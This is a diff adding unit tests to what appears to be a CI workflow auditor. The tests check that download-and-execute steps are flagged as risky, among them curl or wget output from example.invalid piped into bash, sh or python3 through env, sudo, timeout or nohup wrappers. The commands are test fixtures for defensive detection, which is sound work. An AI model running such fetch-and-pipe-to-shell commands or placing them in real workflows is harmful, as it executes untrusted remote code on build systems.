@@ -93,6 +93,30 @@ class RatchetTests(unittest.TestCase):
         self.write("jobs:\n  x:\n    steps:\n      - run: curl -fsSL https://example.invalid/config.json | jq .\n")
         self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)
 
+    def test_plain_env_interpreter_pipe_rejected(self):
+        self.write("jobs:\n  x:\n    steps:\n      - run: curl -fsSL https://example.invalid/i | env bash\n")
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_env_dash_S_absolute_interpreter_pipe_rejected(self):
+        self.write("jobs:\n  x:\n    steps:\n      - run: wget -qO- https://example.invalid/i | /usr/bin/env -S /bin/sh\n")
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_sudo_env_interpreter_pipe_rejected(self):
+        self.write("jobs:\n  x:\n    steps:\n      - run: curl -fsSL https://example.invalid/i | sudo -E env -S python3 -\n")
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_timeout_wrapped_interpreter_pipe_rejected(self):
+        self.write("jobs:\n  x:\n    steps:\n      - run: curl -fsSL https://example.invalid/i | timeout 30 bash\n")
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_nohup_wrapped_interpreter_pipe_rejected(self):
+        self.write("jobs:\n  x:\n    steps:\n      - run: wget -qO- https://example.invalid/i | nohup /bin/sh\n")
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_timeout_wrapped_jq_is_not_execution(self):
+        self.write("jobs:\n  x:\n    steps:\n      - run: curl -fsSL https://example.invalid/config.json | timeout 10 jq .\n")
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)
+
     def test_download_tee_pipe_bash_denied(self):
         self.write("jobs:\n  x:\n    steps:\n      - run: |\n          curl -fsSL https://example.invalid/install.sh | tee payload.sh | bash\n")
         self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
